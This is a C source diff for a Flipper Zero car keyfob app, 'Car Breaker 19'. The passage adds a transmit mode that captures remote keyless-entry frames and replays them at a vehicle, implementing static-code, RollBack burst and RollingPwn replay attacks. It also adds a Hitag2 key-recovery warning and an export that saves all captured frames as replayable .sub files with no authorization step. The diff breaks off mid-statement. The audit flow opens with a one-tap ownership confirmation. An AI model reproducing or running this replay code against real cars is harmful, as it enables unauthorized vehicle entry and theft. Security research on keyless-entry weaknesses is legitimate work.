@@ -9,7 +9,9 @@
 #include <gui/modules/submenu.h>
 #include <gui/modules/dialog_ex.h>
 #include <input/input.h>
+#include <storage/storage.h>
 #include <lib/subghz/subghz_worker.h>
+#include <toolbox/level_duration.h>
 #include <toolbox/crc32_calc.h>
 #include <notification/notification_messages.h>
 
@@ -19,6 +21,7 @@
 #include <math.h>
 
 #include "scenes/car_breaker19_scene_about.h"
+#include "car_breaker_audit.h"
 
 #define TAG "CarBreaker19"
 
@@ -114,7 +117,9 @@ typedef struct {
     bool hitag2_entropy_critical;
     bool hitag2_keystream_repeat;
     bool hitag2_counter_regression;
+    bool hitag2_key_exposure_risk; // >= 4 valid frames from one UID: published key-recovery precondition
     uint8_t hitag2_window_size;
+    uint16_t hitag2_uid_frame_count;
     uint32_t hitag2_uid;
     uint16_t hitag2_last_counter;
     uint32_t hitag2_last_keystream;
@@ -131,6 +136,8 @@ typedef struct {
 
 static void car_breaker_start_capture(CarBreakerApp* app);
 static void car_breaker_stop_capture(CarBreakerApp* app);
+static void car_breaker_audit_finish_capture(CarBreakerApp* app);
+static void car_breaker_audit_render(CarBreakerApp* app);
 static bool car_breaker_try_decode_hitag2(
     CarBreakerFrame* frame,
     const CarBreakerPulse* pulses,
@@ -223,12 +230,32 @@ typedef enum {
     CarBreakerViewAbout,
     CarBreakerViewRegionSelect,
     CarBreakerViewProfileSelect,
+    CarBreakerViewAuditSelect,
+    CarBreakerViewAudit,
+    CarBreakerViewKnown,
+    CarBreakerViewKnownDetail,
 } CarBreakerView;
 
 typedef enum {
     CarBreakerMenuStart,
+    CarBreakerMenuGuidedAudit,
+    CarBreakerMenuKnownIssues,
+    CarBreakerMenuExportSession,
     CarBreakerMenuAbout,
 } CarBreakerMenuIndex;
+
+// Guided audit flow steps. Capture reuses the passive RX engine; everything
+// from TxConfirm on transmits frames retained earlier in the same session.
+typedef enum {
+    CarBreakerAuditStepAuth,
+    CarBreakerAuditStepBrief,
+    CarBreakerAuditStepCapture,
+    CarBreakerAuditStepPrepare,
+    CarBreakerAuditStepTxConfirm,
+    CarBreakerAuditStepTxRunning,
+    CarBreakerAuditStepObserve,
+    CarBreakerAuditStepVerdict,
+} CarBreakerAuditStep;
 
 struct CarBreakerApp {
     Gui* gui;
@@ -236,12 +263,17 @@ struct CarBreakerApp {
     Submenu* submenu;
     Submenu* region_menu;
     Submenu* profile_menu;
+    Submenu* audit_menu;
+    Submenu* known_menu;
     DialogEx* splash_dialog;
     DialogEx* capture_dialog;
+    DialogEx* audit_dialog;
+    DialogEx* known_dialog;
     View* about_view;
     NotificationApp* notifications;
     char capture_header[40];
     char capture_text[128];
+    char audit_text[256];
 
     FuriMutex* lock;
     SubGhzWorker* worker;
@@ -251,6 +283,12 @@ struct CarBreakerApp {
     CarBreakerAnalysis analysis;
     CarBreakerPulse pulses[CAR_BREAKER_MAX_PULSES];
     uint16_t pulse_count;
+
+    CarBreakerAuditState* audit;
+    CarBreakerAuditStep audit_step;
+    CarBreakerAuditTest audit_test;
+    uint8_t audit_known_index;
+    bool audit_tx_busy;
 
     uint8_t current_preset_index;
     CarBreakerRegion selected_region;
@@ -592,6 +630,7 @@ static void car_breaker_recompute_analysis_locked(CarBreakerApp* app) {
     size_t hitag2_sample_count = 0;
     bool hitag2_uid_set = false;
     uint32_t hitag2_uid = 0;
+    uint16_t hitag2_uid_frame_count = 0;
 
     for(size_t idx = 0; idx < session->count; idx++) {
         const CarBreakerFrame* frame = &session->frames[idx];
@@ -603,6 +642,7 @@ static void car_breaker_recompute_analysis_locked(CarBreakerApp* app) {
                 hitag2_uid_set = true;
             }
             if(frame->hitag2_uid == hitag2_uid) {
+                hitag2_uid_frame_count++;
                 if(hitag2_sample_count == CAR_BREAKER_HITAG2_WINDOW) {
                     memmove(
                         &hitag2_samples[0],
@@ -704,6 +744,10 @@ static void car_breaker_recompute_analysis_locked(CarBreakerApp* app) {
         updated.hitag2_activity = true;
         updated.hitag2_uid = hitag2_uid;
         updated.hitag2_window_size = hitag2_sample_count;
+        updated.hitag2_uid_frame_count = hitag2_uid_frame_count;
+        // Published correlation attacks recover a Hitag2 key from 4-8 sniffed
+        // frames of one fob; surface that exposure once enough samples exist.
+        updated.hitag2_key_exposure_risk = (hitag2_uid_frame_count >= 4);
         updated.hitag2_entropy_bits_per_byte = entropy;
         updated.hitag2_entropy_low =
             (entropy > 0.0f) && (entropy < CAR_BREAKER_HITAG2_ENTROPY_WARN);
@@ -754,6 +798,27 @@ static void car_breaker_finalize_frame_locked(CarBreakerApp* app) {
     }
 
     car_breaker_try_decode_hitag2(frame, app->pulses, recorded_pulses);
+
+    // Retain the raw frame for guided-audit replay. Only frames that pass
+    // the same validity gate as the analysis engines are worth replaying.
+    if(car_breaker_frame_is_valid(frame)) {
+        uint32_t signed_durations[CAR_BREAKER_AUDIT_MAX_PULSES];
+        uint16_t retain_count =
+            (recorded_pulses < CAR_BREAKER_AUDIT_MAX_PULSES) ? recorded_pulses :
+                                                               CAR_BREAKER_AUDIT_MAX_PULSES;
+        for(uint16_t i = 0; i < retain_count; i++) {
+            int64_t signed_duration =
+                app->pulses[i].level ? (int64_t)app->pulses[i].duration : -(int64_t)app->pulses[i].duration;
+            signed_durations[i] = (int32_t)signed_duration;
+        }
+        car_breaker_audit_retain(
+            app->audit,
+            signed_durations,
+            retain_count,
+            frame->timestamp_ms,
+            frame->hash,
+            frame->preset_index);
+    }
 
     app->pulse_count = 0;
     app->capture_dirty = true;
@@ -915,6 +980,13 @@ static void car_breaker_update_capture_display(CarBreakerApp* app) {
         remaining -= written;
     }
 
+    if(analysis.hitag2_key_exposure_risk && remaining > 0) {
+        written = snprintf(
+            ptr, remaining, "Key recovery risk (%u frames)\n", (unsigned)analysis.hitag2_uid_frame_count);
+        ptr += written;
+        remaining -= written;
+    }
+
     dialog_ex_set_text(app->capture_dialog, app->capture_text, 64, 32, AlignCenter, AlignCenter);
 }
 
@@ -929,6 +1001,17 @@ static void car_breaker_ui_timer_callback(void* context) {
 
     if(dirty && app->active_view == CarBreakerViewCapture) {
         car_breaker_update_capture_display(app);
+    }
+
+    if(app->active_view == CarBreakerViewAudit) {
+        if(app->audit_step == CarBreakerAuditStepCapture) {
+            uint16_t have = car_breaker_audit_capture_count(app->audit);
+            if(app->capturing && have >= app->audit->target_frames) {
+                car_breaker_audit_finish_capture(app);
+            }
+        }
+        // Progress counts and the static-test settle countdown both tick
+        car_breaker_audit_render(app);
     }
 }
 
@@ -1000,11 +1083,573 @@ static void car_breaker_stop_capture(CarBreakerApp* app) {
     furi_hal_subghz_idle();
 
     app->capturing = false;
-    if(app->ui_timer) {
+    // The guided audit keeps the UI timer alive for its progress display
+    if(app->ui_timer && app->active_view != CarBreakerViewAudit) {
         furi_timer_stop(app->ui_timer);
     }
     car_breaker_update_status(app, "Capture paused");
     dialog_ex_set_center_button_text(app->capture_dialog, "Back");
+}
+
+// ---------------------------------------------------------------------------
+// Guided audit: transmit machinery
+// ---------------------------------------------------------------------------
+
+typedef struct {
+    const int32_t* durations;
+    uint16_t count;
+    uint16_t index;
+} CarBreakerTxFeed;
+
+static LevelDuration car_breaker_audit_tx_yield(void* context) {
+    CarBreakerTxFeed* feed = context;
+    if(feed->index >= feed->count) {
+        return level_duration_reset();
+    }
+    int32_t signed_duration = feed->durations[feed->index++];
+    uint32_t duration =
+        (signed_duration < 0) ? (uint32_t)(-signed_duration) : (uint32_t)signed_duration;
+    if(duration == 0) duration = 1;
+    return level_duration_make(signed_duration >= 0, duration);
+}
+
+/** Transmit one retained frame with the preset it was captured with. */
+static bool
+    car_breaker_audit_transmit_frame(CarBreakerApp* app, const CarBreakerAuditFrame* frame) {
+    if(!app || !frame || !frame->valid) return false;
+    if(app->capturing) {
+        car_breaker_stop_capture(app);
+    }
+
+    const CarBreakerPreset* preset = NULL;
+    if(frame->preset_index < CAR_BREAKER_PRESETS_COUNT) {
+        preset = &car_breaker_presets[frame->preset_index];
+    } else {
+        preset = &car_breaker_presets[app->current_preset_index];
+    }
+
+    furi_hal_subghz_idle();
+    furi_hal_subghz_load_custom_preset(preset->regs);
+    furi_hal_subghz_set_frequency_and_path(preset->frequency);
+
+    CarBreakerTxFeed feed = {
+        .durations = frame->durations,
+        .count = frame->count,
+        .index = 0,
+    };
+
+    bool started = furi_hal_subghz_start_async_tx(car_breaker_audit_tx_yield, &feed);
+    if(!started) {
+        // TX refused, e.g. regulation-locked firmware
+        furi_hal_subghz_idle();
+        return false;
+    }
+
+    uint32_t started_at = furi_get_tick();
+    while(!furi_hal_subghz_is_async_tx_complete()) {
+        if(furi_get_tick() - started_at > 3000) {
+            break;
+        }
+        furi_delay_ms(10);
+    }
+
+    furi_hal_subghz_stop_async_tx();
+    furi_hal_subghz_idle();
+    return true;
+}
+
+/** Run one audit replay step; a RollBack burst sends its frames back to back. */
+static bool car_breaker_audit_run_tx_step(CarBreakerApp* app) {
+    CarBreakerAuditState* audit = app->audit;
+    bool burst = (audit->test == CarBreakerAuditTestRollBack);
+    bool ok = true;
+
+    do {
+        const CarBreakerAuditFrame* frame = car_breaker_audit_plan_frame(audit, audit->replay_done);
+        if(!frame) break;
+
+        char line[96];
+        snprintf(
+            line,
+            sizeof(line),
+            "Replay %u/%u: %s",
+            audit->replay_done + 1,
+            audit->replay_count,
+            car_breaker_audit_test_name(audit->test));
+        car_breaker_update_status(app, line);
+
+        ok = car_breaker_audit_transmit_frame(app, frame);
+        furi_mutex_acquire(app->lock, FuriWaitForever);
+        car_breaker_audit_log(
+            audit,
+            "Replay %u/%u: tx=%s",
+            audit->replay_done + 1,
+            audit->replay_count,
+            ok ? "ok" : "BLOCKED");
+        furi_mutex_release(app->lock);
+        audit->replay_done++;
+
+        if(!ok) break;
+        if(burst && audit->replay_done < audit->replay_count) {
+            furi_delay_ms(CAR_BREAKER_AUDIT_BURST_GAP_MS);
+        }
+    } while(burst && audit->replay_done < audit->replay_count);
+
+    audit->last_tx_ok = ok;
+    return ok;
+}
+
+// ---------------------------------------------------------------------------
+// Guided audit: flow control
+// ---------------------------------------------------------------------------
+
+static void car_breaker_audit_finish_capture(CarBreakerApp* app) {
+    car_breaker_stop_capture(app);
+    // The retention ring keeps the raw frames for the transmit phase; the
+    // analysis session data stays untouched for passive findings.
+    app->audit_step =
+        (app->audit_test == CarBreakerAuditTestRollingPwn) ? CarBreakerAuditStepPrepare :
+                                                              CarBreakerAuditStepTxConfirm;
+
+    CarBreakerAuditState* audit = app->audit;
+    furi_mutex_acquire(app->lock, FuriWaitForever);
+    car_breaker_audit_log(audit, "Capture done: %u frames", car_breaker_audit_capture_count(audit));
+    car_breaker_audit_build_plan(audit);
+    car_breaker_audit_log(
+        audit, "Plan: %u replay(s), bounded at %u", audit->replay_count, CAR_BREAKER_AUDIT_MAX_REPLAYS);
+    furi_mutex_release(app->lock);
+}
+
+static void car_breaker_audit_set_verdict(CarBreakerApp* app, CarBreakerAuditVerdict verdict) {
+    CarBreakerAuditState* audit = app->audit;
+    audit->verdict = verdict;
+    app->audit_step = CarBreakerAuditStepVerdict;
+
+    furi_mutex_acquire(app->lock, FuriWaitForever);
+    car_breaker_audit_log(audit, "VERDICT: %s", car_breaker_audit_verdict_name(verdict));
+    if(verdict == CarBreakerAuditVerdictVulnerable) {
+        car_breaker_audit_log(
+            audit, "Car reacted to replayed code(s): %s mechanism confirmed.", car_breaker_audit_test_name(audit->test));
+    } else if(verdict == CarBreakerAuditVerdictNotDetected) {
+        car_breaker_audit_log(
+            audit, "No reaction within the tested scope; not proof of safety.");
+    }
+    uint32_t epoch = furi_hal_rtc_get_timestamp();
+    bool saved = car_breaker_audit_export_log(audit, epoch);
+    car_breaker_audit_log(
+        audit, "Log %s: " CAR_BREAKER_AUDIT_DIR "/%s%lu.txt", saved ? "saved" : "export FAILED", CAR_BREAKER_AUDIT_LOG_PREFIX, epoch);
+    furi_mutex_release(app->lock);
+
+    // Verdict is terminal: no more live data to refresh
+    if(app->ui_timer) {
+        furi_timer_stop(app->ui_timer);
+    }
+
+    if(verdict == CarBreakerAuditVerdictVulnerable) {
+        notification_message(app->notifications, &sequence_error);
+    }
+}
+
+static const char* car_breaker_audit_step_title(CarBreakerApp* app) {
+    switch(app->audit_step) {
+    case CarBreakerAuditStepAuth:
+        return "Authorization";
+    case CarBreakerAuditStepBrief:
+        return car_breaker_audit_test_name(app->audit_test);
+    case CarBreakerAuditStepCapture:
+        return "Audit: Capture";
+    case CarBreakerAuditStepPrepare:
+        return "Audit: Prepare";
+    case CarBreakerAuditStepTxConfirm:
+        return "Audit: TX";
+    case CarBreakerAuditStepTxRunning:
+        return "Audit: Sending";
+    case CarBreakerAuditStepObserve:
+        return "Audit: Observe";
+    case CarBreakerAuditStepVerdict:
+        return "Audit Result";
+    default:
+        return "Guided Audit";
+    }
+}
+
+static void car_breaker_audit_render(CarBreakerApp* app) {
+    CarBreakerAuditState* audit = app->audit;
+    const char* header = car_breaker_audit_step_title(app);
+    char* text = app->audit_text;
+    size_t remaining = sizeof(app->audit_text);
+
+    dialog_ex_set_header(app->audit_dialog, header, 64, 2, AlignCenter, AlignTop);
+    dialog_ex_set_left_button_text(app->audit_dialog, NULL);
+    dialog_ex_set_right_button_text(app->audit_dialog, NULL);
+    dialog_ex_set_center_button_text(app->audit_dialog, "OK");
+
+    switch(app->audit_step) {
+    case CarBreakerAuditStepAuth:
+        snprintf(
+            text,
+            remaining,
+            "I confirm this vehicle is\n"
+            "mine or I am authorized\n"
+            "to test it. Only signals\n"
+            "captured in this session\n"
+            "will be transmitted.");
+        dialog_ex_set_center_button_text(app->audit_dialog, "I Agree");
+        break;
+
+    case CarBreakerAuditStepBrief: {
+        const char* brief = car_breaker_audit_test_brief(app->audit_test);
+        uint16_t have = car_breaker_audit_capture_count(audit);
+        snprintf(text, remaining, "%s\nCaptured so far: %u", brief, have);
+        dialog_ex_set_center_button_text(app->audit_dialog, "Start Capture");
+        break;
+    }
+
+    case CarBreakerAuditStepCapture: {
+        uint16_t have = car_breaker_audit_capture_count(audit);
+        uint16_t target = audit->target_frames;
+        snprintf(
+            text,
+            remaining,
+            "%s\n\nFrames: %u/%u\n%s",
+            car_breaker_audit_test_brief(app->audit_test),
+            have,
+            target,
+            have >= audit->min_frames ? "OK to finish early" : "Keep pressing the fob");
+        dialog_ex_set_center_button_text(
+            app->audit_dialog, have >= audit->min_frames ? "Finish" : "...");
+        break;
+    }
+
+    case CarBreakerAuditStepPrepare:
+        snprintf(
+            text,
+            remaining,
+            "Codes captured out of car\n"
+            "range are now unused.\n"
+            "Walk back to the vehicle,\n"
+            "then start transmitting.");
+        dialog_ex_set_center_button_text(app->audit_dialog, "Transmit");
+        break;
+
+    case CarBreakerAuditStepTxConfirm: {
+        const CarBreakerAuditFrame* frame = car_breaker_audit_plan_frame(audit, 0);
+        uint32_t frequency = frame ? car_breaker_presets[frame->preset_index].frequency : 0;
+        uint32_t elapsed_s =
+            (furi_get_tick() - (audit->last_capture_ms ? audit->last_capture_ms : furi_get_tick())) /
+            furi_ms_to_ticks(1000);
+
+        if(app->audit_test == CarBreakerAuditTestStaticCode &&
+           elapsed_s < CAR_BREAKER_AUDIT_STATIC_SETTLE_S) {
+            snprintf(
+                text,
+                remaining,
+                "Settle delay: wait %lus\n"
+                "before replaying the\n"
+                "used code (fresh rolling\n"
+                "codes would mask the\n"
+                "result).",
+                (unsigned long)(CAR_BREAKER_AUDIT_STATIC_SETTLE_S - elapsed_s));
+            dialog_ex_set_center_button_text(app->audit_dialog, NULL);
+        } else {
+            snprintf(
+                text,
+                remaining,
+                "Ready to transmit\n"
+                "%u frame(s) at\n"
+                "%lu.%02lu MHz.\n"
+                "Keep the fob away!",
+                audit->replay_count,
+                frequency / 1000000,
+                (frequency / 10000) % 100);
+            dialog_ex_set_center_button_text(app->audit_dialog, "Transmit");
+        }
+        break;
+    }
+
+    case CarBreakerAuditStepTxRunning:
+        snprintf(
+            text,
+            remaining,
+            "Transmitting replay %u/%u...",
+            audit->replay_done + (audit->last_tx_ok ? 0 : 1),
+            audit->replay_count);
+        dialog_ex_set_center_button_text(app->audit_dialog, NULL);
+        break;
+
+    case CarBreakerAuditStepObserve:
+        snprintf(
+            text,
+            remaining,
+            "Watch the car:\n"
+            "did it unlock, lock or\n"
+            "flash the indicators\n"
+            "after the replay?");
+        dialog_ex_set_left_button_text(app->audit_dialog, "No");
+        dialog_ex_set_right_button_text(app->audit_dialog, "Yes");
+        dialog_ex_set_center_button_text(app->audit_dialog, NULL);
+        break;
+
+    case CarBreakerAuditStepVerdict:
+        switch(audit->verdict) {
+        case CarBreakerAuditVerdictVulnerable:
+            snprintf(
+                text,
+                remaining,
+                "VULNERABLE\n"
+                "The car accepted a\n"
+                "replayed code (%s).\n"
+                "%s",
+                car_breaker_audit_test_name(audit->test),
+                audit->log_exported ? "Log saved to\n" CAR_BREAKER_AUDIT_DIR : "Log export failed");
+            break;
+        case CarBreakerAuditVerdictNotDetected:
+            snprintf(
+                text,
+                remaining,
+                "NOT DETECTED\n"
+                "No reaction within the\n"
+                "tested scope. Not a\n"
+                "proof of safety.\n%s",
+                audit->log_exported ? "Log saved." : "Log export failed");
+            break;
+        case CarBreakerAuditVerdictInconclusive:
+            snprintf(
+                text,
+                remaining,
+                "INCONCLUSIVE\n"
+                "No reaction within the\n"
+                "bounded replay count.\n%s",
+                audit->log_exported ? "Log saved." : "Log export failed");
+            break;
+        case CarBreakerAuditVerdictAborted:
+            snprintf(text, remaining, "ABORTED\nNo signals were sent.");
+            break;
+        default:
+            snprintf(text, remaining, "PENDING");
+            break;
+        }
+        dialog_ex_set_center_button_text(app->audit_dialog, "Back");
+        break;
+    }
+
+    dialog_ex_set_text(app->audit_dialog, text, 64, 24, AlignCenter, AlignTop);
+}
+
+static void car_breaker_audit_next_replay_or_finish(CarBreakerApp* app) {
+    CarBreakerAuditState* audit = app->audit;
+
+    if(app->audit_test != CarBreakerAuditTestRollingPwn ||
+       audit->replay_done >= audit->replay_count) {
+        // Static and RollBack ask once after their (single or burst) send;
+        // RollingPwn asks after every code until one is accepted
+        car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictNotDetected);
+        return;
+    }
+
+    // RollingPwn: more unused codes remain
+    app->audit_step = CarBreakerAuditStepTxConfirm;
+}
+
+static void car_breaker_audit_dialog_callback(DialogExResult result, void* context) {
+    CarBreakerApp* app = context;
+    CarBreakerAuditState* audit = app->audit;
+
+    if(!car_breaker_is_key_debounced(app)) return;
+
+    switch(app->audit_step) {
+    case CarBreakerAuditStepAuth:
+        if(result == DialogExResultCenter) {
+            app->audit_step = CarBreakerAuditStepBrief;
+        } else if(result == DialogExResultLeft || result == DialogExResultRight) {
+            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
+        }
+        break;
+
+    case CarBreakerAuditStepBrief:
+        if(result == DialogExResultCenter) {
+            app->audit_step = CarBreakerAuditStepCapture;
+            car_breaker_start_capture(app);
+        } else if(result == DialogExResultLeft) {
+            car_breaker_safe_switch_view(app, CarBreakerViewAuditSelect);
+            return;
+        }
+        break;
+
+    case CarBreakerAuditStepCapture:
+        if(result == DialogExResultCenter &&
+           car_breaker_audit_capture_count(audit) >= audit->min_frames) {
+            car_breaker_audit_finish_capture(app);
+        } else if(result == DialogExResultLeft) {
+            car_breaker_stop_capture(app);
+            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
+        }
+        break;
+
+    case CarBreakerAuditStepPrepare:
+        if(result == DialogExResultCenter) {
+            app->audit_step = CarBreakerAuditStepTxConfirm;
+        } else if(result == DialogExResultLeft) {
+            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
+        }
+        break;
+
+    case CarBreakerAuditStepTxConfirm:
+        if(result == DialogExResultCenter) {
+            app->audit_step = CarBreakerAuditStepTxRunning;
+            car_breaker_audit_render(app);
+            car_breaker_audit_run_tx_step(app);
+            if(!audit->last_tx_ok) {
+                car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictInconclusive);
+                notification_message(app->notifications, &sequence_error);
+            } else {
+                app->audit_step = CarBreakerAuditStepObserve;
+            }
+        } else if(result == DialogExResultLeft) {
+            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
+        }
+        break;
+
+    case CarBreakerAuditStepTxRunning:
+        break;
+
+    case CarBreakerAuditStepObserve:
+        if(result == DialogExResultRight) {
+            notification_message(app->notifications, &sequence_success);
+            car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictVulnerable);
+        } else if(result == DialogExResultLeft) {
+            car_breaker_audit_next_replay_or_finish(app);
+        }
+        break;
+
+    case CarBreakerAuditStepVerdict:
+        if(result == DialogExResultCenter || result == DialogExResultLeft) {
+            car_breaker_safe_switch_view(app, CarBreakerViewMenu);
+            return;
+        }
+        break;
+    }
+
+    if(app->active_view == CarBreakerViewAudit) {
+        car_breaker_audit_render(app);
+    }
+}
+
+static uint32_t car_breaker_audit_previous_callback(void* context) {
+    CarBreakerApp* app = context;
+    if(app->audit_step == CarBreakerAuditStepCapture) {
+        car_breaker_stop_capture(app);
+    }
+    if(app->audit_step != CarBreakerAuditStepAuth && app->audit_step != CarBreakerAuditStepVerdict) {
+        car_breaker_audit_set_verdict(app, CarBreakerAuditVerdictAborted);
+    }
+    return CarBreakerViewMenu;
+}
+
+static void car_breaker_audit_menu_callback(void* context, uint32_t index) {
+    CarBreakerApp* app = context;
+    if(index >= CarBreakerAuditTestCount) return;
+    if(!car_breaker_is_key_debounced(app)) return;
+
+    app->audit_test = (CarBreakerAuditTest)index;
+    car_breaker_audit_begin(app->audit, app->audit_test);
+
+    uint32_t epoch = furi_hal_rtc_get_timestamp();
+    furi_mutex_acquire(app->lock, FuriWaitForever);
+    car_breaker_audit_log(app->audit, "Car Breaker 19 Guided Audit");
+    car_breaker_audit_log(app->audit, "Test: %s", car_breaker_audit_test_name(app->audit_test));
+    car_breaker_audit_log(app->audit, "Started: %lu", epoch);
+    car_breaker_audit_log(
+        app->audit,
+        "Region: %s, Profile: %s",
+        car_breaker_region_names[app->selected_region],
+        car_breaker_profile_names[app->selected_profile]);
+    furi_mutex_release(app->lock);
+
+    app->audit_step = CarBreakerAuditStepAuth;
+    car_breaker_audit_render(app);
+    car_breaker_safe_switch_view(app, CarBreakerViewAudit);
+}
+
+static uint32_t car_breaker_audit_select_previous_callback(void* context) {
+    CarBreakerApp* app = context;
+    // Leaving test selection without choosing aborts nothing yet
+    UNUSED(app);
+    return CarBreakerViewMenu;
+}
+
+static void car_breaker_known_menu_callback(void* context, uint32_t index) {
+    CarBreakerApp* app = context;
+    if(!car_breaker_is_key_debounced(app)) return;
+
+    const CarBreakerKnownIssue* issue = car_breaker_audit_known_issue(index);
+    if(!issue) return;
+
+    dialog_ex_set_header(app->known_dialog, issue->brand, 64, 2, AlignCenter, AlignTop);
+    char text[192];
+    snprintf(text, sizeof(text), "%s\n\n%s\n\nSource: arXiv 2505.02713", issue->issue, issue->detail);
+    dialog_ex_set_text(app->known_dialog, text, 64, 20, AlignCenter, AlignTop);
+    dialog_ex_set_center_button_text(app->known_dialog, "Back");
+    dialog_ex_set_left_button_text(app->known_dialog, NULL);
+    dialog_ex_set_right_button_text(app->known_dialog, NULL);
+    car_breaker_safe_switch_view(app, CarBreakerViewKnownDetail);
+}
+
+static uint32_t car_breaker_known_list_previous_callback(void* context) {
+    CarBreakerApp* app = context;
+    UNUSED(app);
+    return CarBreakerViewMenu;
+}
+
+static uint32_t car_breaker_known_detail_previous_callback(void* context) {
+    CarBreakerApp* app = context;
+    UNUSED(app);
+    return CarBreakerViewKnown;
+}
+
+static void car_breaker_known_dialog_callback(DialogExResult result, void* context) {
+    CarBreakerApp* app = context;
+    if(!car_breaker_is_key_debounced(app)) return;
+    if(result == DialogExResultCenter) {
+        car_breaker_safe_switch_view(app, CarBreakerViewKnown);
+    }
+}
+
+/** Write every retained frame as a stock-compatible .sub file. */
+static void car_breaker_export_session(CarBreakerApp* app) {
+    uint16_t total = car_breaker_audit_retained_total(NULL);
+    uint32_t epoch = furi_hal_rtc_get_timestamp();
+    uint16_t exported = 0;
+
+    Storage* storage = furi_record_open(RECORD_STORAGE);
+    storage_common_mkdir(storage, CAR_BREAKER_AUDIT_DIR);
+    furi_record_close(RECORD_STORAGE);
+
+    for(uint16_t k = 0; k < total; k++) {
+        const CarBreakerAuditFrame* frame = car_breaker_audit_retained_frame(k);
+        if(!frame) continue;
+
+        const CarBreakerPreset* preset = &car_breaker_presets[frame->preset_index];
+        char path[96];
+        snprintf(path, sizeof(path), "%s/frame_%u_%lu.sub", CAR_BREAKER_AUDIT_DIR, k, epoch);
+        if(car_breaker_audit_export_sub(frame, preset->frequency, preset->regs, preset->regs_size, path)) {
+            exported++;
+        }
+    }
+
+    char text[160];
+    snprintf(
+        text,
+        sizeof(text),
+        "%u of %u frame(s)\nwritten to\n" CAR_BREAKER_AUDIT_DIR,
+        exported,
+        total);
+    dialog_ex_set_header(app->known_dialog, "Export Session", 64, 2, AlignCenter, AlignTop);
+    dialog_ex_set_text(app->known_dialog, text, 64, 24, AlignCenter, AlignTop);
+    dialog_ex_set_center_button_text(app->known_dialog, "Back");
+    dialog_ex_set_left_button_text(app->known_dialog, NULL);
+    dialog_ex_set_right_button_text(app->known_dialog, NULL);
+    car_breaker_safe_switch_view(app, CarBreakerViewKnown);
 }
 
 
@@ -1063,6 +1708,15 @@ static void car_breaker_submenu_callback(void* context, uint32_t index) {
         app->pending_capture = true;
         car_breaker_show_region_menu(app);
         break;
+    case CarBreakerMenuGuidedAudit:
+        car_breaker_safe_switch_view(app, CarBreakerViewAuditSelect);
+        break;
+    case CarBreakerMenuKnownIssues:
+        car_breaker_safe_switch_view(app, CarBreakerViewKnown);
+        break;
+    case CarBreakerMenuExportSession:
+        car_breaker_export_session(app);
+        break;
     case CarBreakerMenuAbout:
         car_breaker_safe_switch_view(app, CarBreakerViewAbout);
         break;
@@ -1077,6 +1731,9 @@ static CarBreakerApp* car_breaker_alloc(void) {
 
     app->lock = furi_mutex_alloc(FuriMutexTypeNormal);
     app->worker = subghz_worker_alloc();
+    app->audit = car_breaker_audit_alloc();
+    app->audit_step = CarBreakerAuditStepAuth;
+    app->audit_test = CarBreakerAuditTestStaticCode;
     snprintf(app->status_message, sizeof(app->status_message), "Ready");
     app->selected_region = CarBreakerRegionUSA;
     app->selected_profile = CarBreakerProfileHondaModern;
@@ -1096,7 +1753,7 @@ static CarBreakerApp* car_breaker_alloc(void) {
     dialog_ex_set_header(app->splash_dialog, "Car Breaker 19", 64, 3, AlignCenter, AlignTop);
     dialog_ex_set_text(
         app->splash_dialog,
-        "Passive Honda/Mini RKE\nRolling-Pwn / RollBack alerts\nHitag2 entropy warnings.",
+        "Passive RKE analysis +\nguided self-audit tests\n(own/authorized vehicles\nonly).",
         64,
         32,
         AlignCenter,
@@ -1112,6 +1769,12 @@ static CarBreakerApp* car_breaker_alloc(void) {
     submenu_set_header(app->submenu, "Car Breaker 19");
     submenu_add_item(
         app->submenu, "Start Capture", CarBreakerMenuStart, car_breaker_submenu_callback, app);
+    submenu_add_item(
+        app->submenu, "Guided Audit (TX)", CarBreakerMenuGuidedAudit, car_breaker_submenu_callback, app);
+    submenu_add_item(
+        app->submenu, "Known Issues", CarBreakerMenuKnownIssues, car_breaker_submenu_callback, app);
+    submenu_add_item(
+        app->submenu, "Export Session", CarBreakerMenuExportSession, car_breaker_submenu_callback, app);
     submenu_add_item(
         app->submenu, "About", CarBreakerMenuAbout, car_breaker_submenu_callback, app);
     view_set_previous_callback(submenu_get_view(app->submenu), car_breaker_menu_previous_callback);
@@ -1159,6 +1822,47 @@ static CarBreakerApp* car_breaker_alloc(void) {
     view_dispatcher_add_view(
         app->view_dispatcher, CarBreakerViewCapture, dialog_ex_get_view(app->capture_dialog));
 
+    // Guided audit test selection
+    app->audit_menu = submenu_alloc();
+    submenu_set_header(app->audit_menu, "Guided Audit");
+    for(uint32_t i = 0; i < CarBreakerAuditTestCount; i++) {
+        submenu_add_item(
+            app->audit_menu,
+            car_breaker_audit_test_name((CarBreakerAuditTest)i),
+            i,
+            car_breaker_audit_menu_callback,
+            app);
+    }
+    view_set_previous_callback(submenu_get_view(app->audit_menu), car_breaker_audit_select_previous_callback);
+    view_dispatcher_add_view(
+        app->view_dispatcher, CarBreakerViewAuditSelect, submenu_get_view(app->audit_menu));
+
+    // Guided audit flow dialog
+    app->audit_dialog = dialog_ex_alloc();
+    dialog_ex_set_context(app->audit_dialog, app);
+    dialog_ex_set_result_callback(app->audit_dialog, car_breaker_audit_dialog_callback);
+    view_set_previous_callback(dialog_ex_get_view(app->audit_dialog), car_breaker_audit_previous_callback);
+    view_dispatcher_add_view(
+        app->view_dispatcher, CarBreakerViewAudit, dialog_ex_get_view(app->audit_dialog));
+
+    // Known issues list and detail
+    app->known_menu = submenu_alloc();
+    submenu_set_header(app->known_menu, "Documented RKE Issues");
+    for(uint8_t i = 0; i < car_breaker_audit_known_issue_count(); i++) {
+        const CarBreakerKnownIssue* issue = car_breaker_audit_known_issue(i);
+        submenu_add_item(app->known_menu, issue->brand, i, car_breaker_known_menu_callback, app);
+    }
+    view_set_previous_callback(submenu_get_view(app->known_menu), car_breaker_known_list_previous_callback);
+    view_dispatcher_add_view(
+        app->view_dispatcher, CarBreakerViewKnown, submenu_get_view(app->known_menu));
+
+    app->known_dialog = dialog_ex_alloc();
+    dialog_ex_set_context(app->known_dialog, app);
+    dialog_ex_set_result_callback(app->known_dialog, car_breaker_known_dialog_callback);
+    view_set_previous_callback(dialog_ex_get_view(app->known_dialog), car_breaker_known_detail_previous_callback);
+    view_dispatcher_add_view(
